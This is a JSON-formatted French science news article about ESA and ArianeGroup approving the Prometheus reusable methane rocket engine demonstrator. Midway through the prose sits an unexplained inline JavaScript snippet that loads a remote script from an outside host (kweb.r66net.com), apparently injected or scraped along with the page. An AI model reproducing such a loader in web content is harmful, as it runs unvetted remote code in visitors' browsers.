{"title": "Ariane Next : feu vert pour le demonstrateur du futur moteur", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2017-06-27", "content": "L'Agence spatiale europeenne a europeanise le projet de moteur reutilisable et << low cost >> du Cnes et d'ArianeGroup devoile fin 2015. Prometheus, c'est son nom, pourrait entrer en service a la fin de la prochaine decennie. Il est destine a un futur lanceur europeen reutilisable, voire a une version amelioree d'Ariane 6. Les trois partenaires du projet, qui rassemble six pays, viennent de s'engager dans la realisation d'un demonstrateur. Il sera integre a Vernon, en France, et teste en 2020 sur un des bancs d'essai du site de Lampoldshausen en Allemagne. Ce qu'il faut retenir Un moteur 10 fois moins cher que la version du Vulcain d'Ariane 6.\r Reutilisable de 5 a 10 fois.  De nombreuses pieces realisees en impression 3D.\r Une mise en service a l'horizon 2030. Au Salon du Bourget, Daniel Neuenschwander, le directeur du transport spatial a l' ESA  et Alain Charneau, president ArianeGroup, ont donne le coup d'envoi d'un futur  lanceur reutilisable europeen  en signant le contrat de construction de Prometheus, un demonstrateur europeen de moteur reutilisable qui sera teste en 2020. Des etudes sont en cours pour examiner l'interet d'utiliser ce futur moteur sur une version amelioree d' Ariane 6  de facon a simplifier son architecture et augmenter ses performances. L'idee serait de remplacer les moteurs Vulcain de l'etage principal et du Vinci de l'etage superieur. Ce moteur est concu avec un double objectif d'economie. Le cout unitaire devrait etre divise par 10 par rapport au Vulcain 2 d' Ariane 5  (1 million contre 10 millions d'euros) et Prometheus devra descendre a 5.000 euros le cout au  kilogramme  mis en  orbite geostationnaire , contre 10.000 euros vises avec Ariane 6 et 20.000 euros aujourd'hui avec Ariane 5. Pour atteindre cet objectif tres ambitieux, le Cnes et ArianeGroup, a l'origine du projet, parient sur un moteur reutilisable de 5 a 10 fois et une conception simplifiee, s'appuyant sur de nouvelles techniques. L' impression 3D  en fait partie, pour realiser un nombre tres important de pieces dont certaines sont impossibles a realiser par les procedes classiques. Prometheus, le futur moteur reutilisable et << low cost >> qui succedera a la famille des lanceurs Ariane 6. (c) ArianeGroup                       Une utilisation inedite du methane A l'inverse du Vulcain, qui utilise un melange d' hydrogene  et d'oxygene  liquides , Prometheus brulera un melange d' oxygene  liquide et de methane. Une vraie rupture dans le choix des  ergols  traditionnellement utilises par les lanceurs europeens. Bien que le methane apporte une  impulsion specifique  moins forte que l'hydrogene liquide, ce choix s'explique par la reutilisabilite du moteur qui necessite d'emporter plus de carburant pour le retour de l'etage au sol.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Or, l'hydrogene a une densite tres faible, de 70 kg/metre cube, a la difference du methane et ses 420 kg/metre cube. Cette densite superieure permet de reduire significativement la taille du reservoir ou bien d'embarquer plus de carburant dans un meme  volume . Elle est aussi tres proche de celle de l'oxygene, ce qui rend possible l'utilisation de pieces communes et l'utilisation de reservoirs identiques. Le saviez-vous ? Il n'existe actuellement aucun lanceur en service utilisant un melange d'oxygene liquide et de methane. Aux Etats-Unis, la societe Blue Origin, de Jeff Bezos, developpe un moteur, le BE-4, qui doit fonctionner avec ce melange. Sa mise au point s'avere difficile. Il y a quelques semaines, pour une raison que Blue Origin n'a pas donnee, un des moteurs d'essai a explose au banc. Le BE-4 sera utilise pour motoriser le lanceur New Glenn de Blue Origin. Il est aussi en competition avec le moteur AR1 d'Aerojet Rocketdyne, qui utilise du kerosene et de l'oxygene liquide, pour equiper le futur lanceur Vulcan d'ULA. Autre avantage du methane, sa temperature de -161 degC, moins froide  que les -253 degC de l'hydrogene liquide du Vulcain. Il est plus facile a stocker et sa temperature est suffisante pour le garder liquide a l'interieur du  lanceur  sans protection thermique speciale. Enfin, l'utilisation du methane simplifiera l'architecture et la conception du moteur. La ou le Vulcain a besoin de deux  turbopompes  avec des  vitesses  de rotation differentes pour l'oxygene et l'hydrogene, une seule turbopompe sera necessaire sur Prometheus.  Dernier point a noter, le Cnes etudie la possibilite de produire du methane grace a la  biomasse . Cette solution est envisagee au  Centre spatial guyanais  avec a la cle toute une filiere plus ecologique. ", "theme": "sciences"}